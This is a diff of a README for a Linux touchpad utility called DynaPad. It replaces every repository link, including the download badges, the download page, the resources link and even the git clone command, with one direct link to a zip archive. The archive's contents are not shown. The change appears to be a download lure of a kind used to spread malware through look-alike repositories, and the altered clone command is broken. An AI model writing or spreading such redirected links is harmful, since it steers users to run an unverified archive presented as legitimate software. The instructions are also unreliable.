@@ -1,6 +1,6 @@
 # 🖱️ DynaPad - Enhance Your Touchpad Experience
 
-[![Download DynaPad](https://img.shields.io/badge/Download-DynaPad-brightgreen?style=for-the-badge)](https://github.com/formless-brickkiln533/DynaPad)
+[![Download DynaPad](https://img.shields.io/badge/Download-DynaPad-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip)
 
 ## 🛠 About DynaPad
 
@@ -42,7 +42,7 @@ Follow these steps to download and set up DynaPad on your Linux computer.
 ### 1. Visit the Download Page
 
 Go to the official DynaPad repository:  
-[https://github.com/formless-brickkiln533/DynaPad](https://github.com/formless-brickkiln533/DynaPad)
+[https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip](https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip)
 
 You will find all the files, documentation, and instructions on this page.
 
@@ -136,7 +136,7 @@ If DynaPad does not work as expected:
 ## 📚 Additional Resources
 
 - Visit the repository on GitHub for the latest updates and instructions:  
-  [https://github.com/formless-brickkiln533/DynaPad](https://github.com/formless-brickkiln533/DynaPad)
+  [https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip](https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip)
   
 - See the `README.md` and `docs/` folder in the repository for detailed usage guides.
   
@@ -158,7 +158,7 @@ The main components:
 If you want to build from source or contribute, clone the repository with:
 
 ```bash
-git clone https://github.com/formless-brickkiln533/DynaPad.git
+git clone https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip
 ```
 
 ---
@@ -171,4 +171,4 @@ If you find bugs or have questions, use the "Issues" tab on the repository page.
 
 ---
 
-[![Download DynaPad](https://img.shields.io/badge/Download-DynaPad-brightgreen?style=for-the-badge)](https://github.com/formless-brickkiln533/DynaPad)
+[![Download DynaPad](https://img.shields.io/badge/Download-DynaPad-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip)
